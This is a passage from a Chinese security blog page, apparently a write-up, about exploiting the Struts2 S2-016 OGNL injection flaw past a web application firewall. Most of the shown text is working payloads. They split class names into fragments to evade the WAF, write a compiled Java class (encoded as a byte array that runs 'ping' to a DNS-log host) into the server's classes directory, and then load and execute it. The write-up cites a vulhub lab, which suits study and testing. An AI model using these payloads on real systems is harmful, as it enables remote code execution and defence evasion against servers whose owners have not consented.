     &#125;</span><br><span class="line">    System.out.println(total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将文件转换成Byte数组</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] getBytesByFile(String pathStr) &#123;</span><br><span class="line">    File file = <span class="keyword">new</span> File(pathStr);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream(<span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1000</span>];</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        <span class="keyword">while</span> ((n = fis.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            bos.write(b, <span class="number">0</span>, n);</span><br><span class="line">        &#125;</span><br><span class="line">        fis.close();</span><br><span class="line">        <span class="keyword">byte</span>[] data = bos.toByteArray();</span><br><span class="line">        bos.close();</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://files.mdnice.com/user/23628/b69ceb06-a785-40bf-b06a-1b1757edf9fa.png"></p>
+<p>payload如下:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:http:<span class="comment">//www.baidu.com$&#123;#req=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletReq&#x27;+&#x27;uest&#x27;),#resp=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletRes&#x27;+&#x27;ponse&#x27;),#resp.setCharacterEncoding(&#x27;UTF-8&#x27;),#ot=#resp.getWriter (),#bb0=new java.io.BufferedWriter(new java.io.FileWriter(&quot;/xxxxx/classes/hellotest.class&quot;,true)),#a=new byte[]&#123;-54,-2,-70,-66,0,0,0,52,0,37,10,0,10,0,22,7,0,23,8,0,24,8,0,25,10,0,26,0,27,10,0,26,0,28,7,0,29,7,0,30,10,0,8,0,22,7,0,31,1,0,6,60,105,110,105,116,62,1,0,3,40,41,86,1,0,4,67,111,100,101,1,0,15,76,105,110,101,78,117,109,98,101,114,84,97,98,108,101,1,0,13,83,116,97,99,107,77,97,112,84,97,98,108,101,7,0,30,7,0,29,1,0,4,109,97,105,110,1,0,22,40,91,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,86,1,0,10,83,111,117,114,99,101,70,105,108,101,1,0,10,104,101,108,108,111,46,106,97,118,97,12,0,11,0,12,1,0,16,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,1,0,4,112,105,110,103,1,0,29,116,101,115,116,46,51,57,100,57,48,56,101,102,46,100,110,115,46,49,52,51,51,46,101,117,46,111,114,103,7,0,32,12,0,33,0,34,12,0,35,0,36,1,0,19,106,97,118,97,47,108,97,110,103,47,69,120,99,101,112,116,105,111,110,1,0,5,104,101,108,108,111,1,0,16,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,1,0,17,106,97,118,97,47,108,97,110,103,47,82,117,110,116,105,109,101,1,0,10,103,101,116,82,117,110,116,105,109,101,1,0,21,40,41,76,106,97,118,97,47,108,97,110,103,47,82,117,110,116,105,109,101,59,1,0,4,101,120,101,99,1,0,40,40,91,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,76,106,97,118,97,47,108,97,110,103,47,80,114,111,99,101,115,115,59,0,33,0,8,0,10,0,0,0,0,0,2,0,1,0,11,0,12,0,1,0,13,0,0,0,106,0,4,0,3,0,0,0,32,42,-73,0,1,5,-67,0,2,89,3,18,3,83,89,4,18,4,83,76,-72,0,5,43,-74,0,6,77,-89,0,4,76,-79,0,1,0,4,0,27,0,30,0,7,0,2,0,14,0,0,0,26,0,6,0,0,0,5,0,4,0,8,0,19,0,9,0,27,0,12,0,30,0,11,0,31,0,13,0,15,0,0,0,16,0,2,-1,0,30,0,1,7,0,16,0,1,7,0,17,0,0,9,0,18,0,19,0,1,0,13,0,0,0,37,0,2,0,2,0,0,0,9,-69,0,8,89,-73,0,9,76,-79,0,0,0,1,0,14,0,0,0,10,0,2,0,0,0,16,0,8,0,17,0,1,0,20,0,0,0,2,0,21&#125;,#bb0.append(new java.lang.String(#a)),#bb0.flush(),#bb0.close(),#ot.print(#bb0),#ot.flush(),#ot.close()&#125;</span></span><br></pre></td></tr></table></figure>
+<p>这里写入成功，但是发现两者有很明显的字节差距</p>
+<p><img src="https://files.mdnice.com/user/23628/a1413f24-2a8a-4200-981c-296726f5b6ad.png"></p>
+<p>而且反编译为空，识别不了</p>
+<p><img src="https://files.mdnice.com/user/23628/f61cf171-3121-4ba0-b6c9-0a5d6518a24b.png"></p>
+<p>猜测是因为<code>new java.lang.String</code>的时候编码导致的这个问题，所以继续去找有没有直接写字节的方法</p>
+<p>后面找到<code>java.io.FileOutputStream</code>这个方法，直接通过<code>write</code>可以写入字节，poc如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:http://www.baidu.com<span class="variable">$&#123;#req=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletReq&#x27;+&#x27;uest&#x27;),#resp=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletRes&#x27;+&#x27;ponse&#x27;),#resp.setCharacterEncoding(&#x27;UTF-8&#x27;),#ot=#resp.getWriter (),#bb0=new java.io.FileOutputStream(&quot;/xxxxx/classes/hello3.class&quot;),#a=new byte[]&#123;-54,-2,-70,-66,0,0,0,52,0,37,10,0,10,0,22,7,0,23,8,0,24,8,0,25,10,0,26,0,27,10,0,26,0,28,7,0,29,7,0,30,10,0,8,0,22,7,0,31,1,0,6,60,105,110,105,116,62,1,0,3,40,41,86,1,0,4,67,111,100,101,1,0,15,76,105,110,101,78,117,109,98,101,114,84,97,98,108,101,1,0,13,83,116,97,99,107,77,97,112,84,97,98,108,101,7,0,30,7,0,29,1,0,4,109,97,105,110,1,0,22,40,91,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,86,1,0,10,83,111,117,114,99,101,70,105,108,101,1,0,10,104,101,108,108,111,46,106,97,118,97,12,0,11,0,12,1,0,16,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,1,0,4,112,105,110,103,1,0,29,116,101,115,116,46,51,57,100,57,48,56,101,102,46,100,110,115,46,49,52,51,51,46,101,117,46,111,114,103,7,0,32,12,0,33,0,34,12,0,35,0,36,1,0,19,106,97,118,97,47,108,97,110,103,47,69,120,99,101,112,116,105,111,110,1,0,5,104,101,108,108,111,1,0,16,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,1,0,17,106,97,118,97,47,108,97,110,103,47,82,117,110,116,105,109,101,1,0,10,103,101,116,82,117,110,116,105,109,101,1,0,21,40,41,76,106,97,118,97,47,108,97,110,103,47,82,117,110,116,105,109,101,59,1,0,4,101,120,101,99,1,0,40,40,91,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,76,106,97,118,97,47,108,97,110,103,47,80,114,111,99,101,115,115,59,0,33,0,8,0,10,0,0,0,0,0,2,0,1,0,11,0,12,0,1,0,13,0,0,0,106,0,4,0,3,0,0,0,32,42,-73,0,1,5,-67,0,2,89,3,18,3,83,89,4,18,4,83,76,-72,0,5,43,-74,0,6,77,-89,0,4,76,-79,0,1,0,4,0,27,0,30,0,7,0,2,0,14,0,0,0,26,0,6,0,0,0,5,0,4,0,8,0,19,0,9,0,27,0,12,0,30,0,11,0,31,0,13,0,15,0,0,0,16,0,2,-1,0,30,0,1,7,0,16,0,1,7,0,17,0,0,9,0,18,0,19,0,1,0,13,0,0,0,37,0,2,0,2,0,0,0,9,-69,0,8,89,-73,0,9,76,-79,0,0,0,1,0,14,0,0,0,10,0,2,0,0,0,16,0,8,0,17,0,1,0,20,0,0,0,2,0,21&#125;</span>,<span class="comment">#bb0.write(#a),#bb0.flush(),#bb0.close(),#ot.print(#bb0),#ot.flush(),#ot.close()&#125;</span></span><br></pre></td></tr></table></figure>
+<p>得到的结果如下：</p>
+<p><img src="https://files.mdnice.com/user/23628/60d49fa3-321e-4dcd-862b-c5a21d3368af.png"></p>
+<p>反编译也成功</p>
+<p><img src="https://files.mdnice.com/user/23628/b95bfb15-03fc-4ac9-ba57-99f22dd91ee1.png"></p>
+<p>那么进行本地的file协议加载class类</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:http://www.baidu.com<span class="variable">$&#123;#req=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletReq&#x27;+&#x27;uest&#x27;),#resp=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletRes&#x27;+&#x27;ponse&#x27;),#resp.setCharacterEncoding(&#x27;UTF-8&#x27;),#ot=#resp.getWriter (),#bb0=new java.net.URL[]&#123;new java.net.URL(&quot;file:/xxxxx/WEB-INF/classes/&quot;)&#125;</span>,<span class="comment">#cc0=new java.net.URLClassLoader(#bb0),#cc1=#cc0.loadClass(&quot;hello3&quot;),#cc1.getDeclaredMethods()[0].invoke(#cc1.newInstance()),#ot.print(),#ot.flush(),#ot.close()&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://files.mdnice.com/user/23628/40316357-1a3a-447c-925b-6ab32e0742ff.png"></p>
+<p>dns平台接收到请求，利用成功</p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ol>
+<li>碰到waf不能直接放弃，在能力范围内进行不断尝试与绕过，也许就可以进行绕过。</li>
+<li>尽可能对payload代码进行研究，而不是只依赖于工具，尽量不要<code>工具成功我就成功，工具失败我就失败</code>这种观点。</li>
+</ol>
+<blockquote>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/struts2/s2-016">https://github.com/vulhub/vulhub/tree/master/struts2/s2-016</a> 【struts2 016环境】</p>
+</blockquote>
+
+            <div class="clearfix"></div>
+            <hr class="nogutter">
+        </div>
+        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
+    
+    
+    <a class="pull-right" href="/2022/03/26/burp%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A7%A3%E5%AF%86%E6%95%B0%E6%8D%AE%E6%8F%92%E4%BB%B6/">
+        burp自定义解密数据插件 →
+    </a>
+    
+</nav>
+
+        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
+  /**
+   * 搜狐畅言
+   */
+
+  /*
+  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');
+
+  window.onload = function () {
+    (function () {
+      var appid = 'cytXXXX';
+      var conf = 'prod_xxxxxxxxxxxxxxxxx';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      var loadJs = function (d, a, id) {
+        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
+        var b = document.createElement("script");
+        b.setAttribute("type", "text/javascript");
+        b.setAttribute("charset", "UTF-8");
+        b.setAttribute("src", d);
+        if (id) {
+          b.setAttribute("id", id);
+        }
+        if (typeof a === "function") {
+          if (window.attachEvent) {
+            b.onreadystatechange = function () {
+              var e = b.readyState;
+              if (e === "loaded" || e === "complete") {
+                b.onreadystatechange = null;
+                a()
+              }
+            }
+          } else {
+            b.onload = a
+          }
+        }
+        c.appendChild(b)
+      };
+
+      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
+        window.changyan.api.config({
+          appid: appid,
+          conf: conf
+        })
+      });
+    })();
+  }
+  */
+
+</script>
+</div>
+    </div>
+</section>
+
+
+      
+<!-- ============================ Footer =========================== -->
+
+<footer>
+    <div class="container">
+            <div class="copy">
+                <p>
+                    &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By f0ng. All Rights Reserved.
+                </p>
+                <p>Theme By <a target="_blank" rel="noopener" href="//go.kieran.top" style="color: #767D84">Kieran</a></p>
+            </div>
+            <div class="social">
+                <ul>
+                    
+                    <li><a href="https://github.com/f0ng" title="Github" target="_blank"><i class="icon-github"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="http://weibo.com/ff0ng" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a>&nbsp;</li>
+                    
+                </ul>
+            </div>
+            <div class="clearfix"> </div>
+        </div>
+</footer>
+
+<!-- ============================ END Footer =========================== -->
+      <!-- Load our scripts -->
+<!-- Resizable 'on-demand' full-height hero -->
+<script type="text/javascript">
+    var resizeHero = function () {
+        var hero = $(".cover,.heightblock"),
+            window1 = $(window);
+        hero.css({
+            "height": window1.height()
+        });
+    };
+
+    resizeHero();
+
+    $(window).resize(function () {
+        resizeHero();
+    });
+</script>
+<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
+<script src="/js/scripts.js"></script><!-- Theme scripts -->
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$('#intro').find('img').each(function(){
+  var alt = this.alt;
+
+  if (alt){
+    $(this).after('<span class="caption" style="display:none">' + alt + '</span>');
+  }
+
+  $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="gallery" />');
+});
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+      
+</body>
+</html>
